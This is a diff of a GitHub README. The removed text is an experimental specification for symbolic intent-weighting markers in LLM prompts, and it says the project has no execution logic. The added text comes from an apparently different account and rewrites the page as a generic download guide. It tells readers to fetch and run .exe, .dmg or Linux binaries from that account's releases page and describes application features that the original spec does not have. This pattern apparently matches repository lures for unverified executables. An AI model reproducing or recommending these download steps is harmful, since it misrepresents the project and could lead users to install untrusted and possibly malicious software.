@@ -1,280 +1,121 @@
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) [![GitHub Stars](https://img.shields.io/github/stars/tobs-code/mechatronic-prompting?style=social)](https://github.com/tobs-code/mechatronic-prompting/stargazers) [![GitHub Forks](https://img.shields.io/github/forks/tobs-code/mechatronic-prompting?style=social)](https://github.com/tobs-code/mechatronic-prompting/forks)
+# 🚀 SoftPrompt-IR - Simplifying Your AI Prompts
 
-## SoftPrompt-IR
+[![Download SoftPrompt-IR](https://img.shields.io/badge/Download_SoftPrompt-IR-blue.svg)](https://github.com/JosephRayudu/SoftPrompt-IR/releases)
 
-### Low-Level Intent Weighting & Direction Annotation for LLM Prompts
+## 📄 Introduction
 
-SoftPrompt-IR is **not** a DSL, not a framework, and not a policy system.
+SoftPrompt-IR is a low-level symbolic annotation layer for LLM prompts. It makes intent strength, direction, and priority clear. This application helps you reduce ambiguity, improve safety, and structure prompts effectively. While it is not a domain-specific language or framework, it provides a minimal and composable way to interact with AI systems.
 
-It is a **minimal symbolic annotation layer** for explicitly expressing:
+## 🚀 Getting Started
 
-* intent **strength**
-* intent **direction**
-* intent **priority**
-* intent **dominance / override**
+To get started with SoftPrompt-IR, follow these steps. Don’t worry; it’s easy!
 
-inside natural language prompts.
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/JosephRayudu/SoftPrompt-IR/releases) to find all available versions.
 
-It defines **no execution logic**.
-It only exposes **intent structure** that is otherwise implicit.
+2. **Choose the Latest Version**  
+   Look for the latest version listed. This version includes the newest features and fixes.
 
----
+3. **Download the Application**  
+   Click on the version you want. Find the appropriate file for your operating system.  
+   For example:
+   - **Windows:** Download the `.exe` file
+   - **macOS:** Download the `.dmg` file
+   - **Linux:** Download the `.tar.gz` file
 
-## Why SoftPrompt-IR Exists
+4. **Install the Application**  
+   - **Windows:** Double-click the downloaded `.exe` file to start the installation. Follow the prompts to complete installation.
+   - **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder. 
+   - **Linux:** Extract the files from the `.tar.gz` archive. Open the terminal in the extracted folder and run the application using the command `./SoftPrompt-IR`.
 
-LLMs already reason over latent signals such as:
+## 💻 System Requirements
 
-* priority
-* strength
-* hierarchy
-* enforcement vs. avoidance
-* dominance between instructions
+Ensure your computer meets the following requirements:
 
-Today, these signals are usually:
+- **Operating System:**  
+   - Windows 10 or later
+   - macOS 10.15 (Catalina) or later
+   - A Linux distribution with the latest libraries
 
-* implicit
-* buried in prose
-* distributed across sentences
-* easy to contradict unintentionally
-* hard to inspect or debug
+- **RAM:** At least 4 GB
 
-SoftPrompt-IR makes these signals **explicit and localized**.
+- **Disk Space:** Minimum of 100 MB free space
 
-Not to gain more control —
-but to **reduce ambiguity, noise, and unintended behavior** *before sampling*.
+## 🔧 Download & Install
 
----
+To download the latest version, visit this page: [Download SoftPrompt-IR](https://github.com/JosephRayudu/SoftPrompt-IR/releases).
 
-## Core Idea
+After downloading, follow the installation steps outlined above.
 
-SoftPrompt-IR uses **small symbolic operators** to annotate intent along two axes:
+## ⚙️ Using SoftPrompt-IR
 
-1. **Strength** (how much it should matter)
-2. **Direction** (enforce vs. avoid, downstream vs. blocking)
+Once you have installed SoftPrompt-IR, follow these steps to use it:
 
-It does **not** tell the model *what to do* —
-it tells the model **what matters more than what**.
+1. **Open the Application**  
+   Launch SoftPrompt-IR from your Applications folder or desktop shortcut.
 
-Think of it as **weighting signals**, not commands.
+2. **Create a New Project**  
+   Click on "New Project" to start. Give your project a relevant name.
 
----
+3. **Add Annotations**  
+   Use the interface to add symbolic annotations to your AI prompts. This will make your intents clearer and more structured.
 
-## Minimal Example
+4. **Save Your Work**  
+   Make sure to save your project regularly. This will help prevent any loss of work.
 
-```text
-@TASK(
-  "Write a short story about a failed mission."
-)
+## 📚 Application Features
 
-~<<< PURPLE_PROSE
-~<<  CLICHES
-~<   OVER_EXPLAINING
-````
-These are relative avoidance signals, not prohibitions.
+Some key features of SoftPrompt-IR include:
 
-### Interpretation (informal)
+- **Symbolic Representation:** Easily represent complex intents in a clear format.
+  
+- **Error Reduction:** Minimize misunderstandings with AI by clarifying your prompts.
 
-* Strongly avoid purple prose
-* Moderately avoid clichés
-* Gently discourage over-explaining
+- **User-Friendly Interface:** Navigate through the application with ease. No technical background is needed.
 
-There are:
+- **Flexibility:** Customize your annotations to suit different contexts and scenarios.
 
-* no hard rules
-* no prohibitions
-* no forced decoding
+## 🚧 Troubleshooting
 
-Only **probability shaping** via relative weight.
+If you encounter any issues, consider the following steps:
 
----
+- **Check System Requirements:** Ensure your system meets all requirements for running the application.
 
-## Cascading & Dominance (The Important Part)
+- **Update Your Software:** Sometimes, bugs are fixed in newer versions. Consider downloading the latest version.
 
-SoftPrompt-IR is intentionally **asymmetric**.
+- **Restart the Application:** Closing and reopening the app can solve minor glitches.
 
-More symbols = more weight
-Stronger markers dominate weaker ones
+- **Consult User Documentation:** The documentation provides valuable guidance for troubleshooting common problems.
 
-```text
-!>>> PRIMARY_CONSTRAINT
-~>>  SECONDARY_PREFERENCE
-~>   OPTIONAL_STYLE
-```
+## 🌐 Community and Support
 
-This creates a **cascade**:
+Join our community to share your experiences or get help. You can reach us through the following channels:
 
-* strong intent dominates weaker intent
-* global signals dominate local ones
-* conflicts resolve by weight, not prose order
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/JosephRayudu/SoftPrompt-IR/issues).
+  
+- **User Forum:** Join discussions with other users and developers in our online forum.
 
-No if/else.
-No branching.
-Just dominance.
+## 📝 Contributing
 
-More weight only matters relative to other signals — stacking strength everywhere removes contrast and reduces its effect.
----
+We welcome contributions to improve SoftPrompt-IR. If you want to help, follow these steps:
 
-## Direction Matters
+1. **Fork the Repository:** Duplicate the project to your GitHub account.
+  
+2. **Make Changes:** Implement your improvements locally.
 
-Direction is part of the signal — not decoration.
+3. **Submit a Pull Request:** Share your changes with us for review.
 
-In SoftPrompt-IR, **direction never stands alone**.
-It always modifies a **strength marker**.
-(Direction never modifies intent on its own — it always attaches to an intent marker.)
+## 🔗 Related Topics
 
-### Canonical Form
+This project touches on several important topics, including:
+- AI Alignment
+- AI Safety
+- Generative AI
+- Human-AI Interaction
+- Intent Annotation
 
-```
-[STRENGTH][DIRECTION]
-```
+These topics contribute to improving how we interact with AI and ensure safety in its use.
 
-Strength **always comes first**.
-Direction **always comes after**.
+## ⚡ Final Note
 
----
-
-### Valid Examples
-
-```text
-!>>> MUST_ENFORCE
-~<<< STRONGLY_AVOID
-~<   GENTLY_DE_ESCALATE
-```
-
-Informal intuition:
-
-* `>` pushes intent forward / downstream
-* `<` pulls intent away / de-escalates
-* repetition amplifies directional influence
-* strength determines enforcement level
-
----
-
-### Dependencies (Special Case)
-
-Dependencies are **explicit prerequisite signals**
-
-They are defined **only** like this:
-
-```text
-!<<< REQUIRED_CONDITION
-```
-
-Meaning:
-
-> This intent **cannot proceed unless** the requirement is satisfied.
-
-Dependencies are **not equivalent** to “strong backward preference”.
-They are a **separate semantic construct**.
-
----
-
-### Invalid Forms (Do Not Use)
-
-```text
->>! SOME_CONSTRAINT
-<<~ SOMETHING
-```
-
-Why these are invalid:
-
-* strength must not appear after direction
-* direction must not precede strength
-* there is no postfix weighting in SoftPrompt-IR
-
----
-
-These signals are **not formal semantics** —
-they are **structural cues the model already recognizes** from rules, configs,
-policies, and priority annotations seen during training.
-
----
-
-## Why This Works (Without Training)
-
-LLMs have seen massive amounts of:
-
-* config files
-* rulesets
-* policies
-* flags
-* priority markers
-* logs and diagnostics
-
-SoftPrompt-IR does **not** invent meaning.
-
-It leverages the model’s ability to exploit:
-
-* consistent structure
-* relative salience
-* symbolic hierarchy
-
----
-
-## What SoftPrompt-IR Is *Not*
-
-SoftPrompt-IR is **not**:
-
-* a jailbreaking technique
-* a prompt hacking method
-* a safety bypass
-* a classifier replacement
-* a programming language
-
-In many cases, it does the opposite:
-👉 it makes unsafe or contradictory intent **harder to hide**.
-
----
-
-## Why Low-Level Matters
-
-SoftPrompt-IR operates **below** common prompt conventions.
-
-That makes it:
-
-* composable with any prompt
-* compatible with safety systems
-* ignorable if unsupported
-* predictable when it fails
-
-Low-level primitives tend to:
-
-* age well
-* combine easily
-* degrade gracefully
-* be hard to misuse accidentally
-
----
-
-## Design Philosophy
-
-SoftPrompt-IR prioritizes:
-
-* explicit over implicit
-* weighting over wording
-* de-escalation over prohibition
-* structure over cleverness
-* compatibility over control
-
----
-
-**SoftPrompt-IR is meant to annotate only the parts that tend to be misweighted, not every detail of a prompt.**
-
----
-
-## Status
-
-This is an **experimental specification**.
-
-There is:
-
-* no enforcement
-* no guarantee
-* no hidden mechanism
-
-Just a small idea:
-
-> Make intent **visible** before sampling.
-
-If it feels obvious in hindsight —
-that means it’s probably at the right level 🙂
+Thank you for using SoftPrompt-IR. We hope it helps you clarify and enhance your AI prompts. If you have any questions or feedback, do not hesitate to reach out!
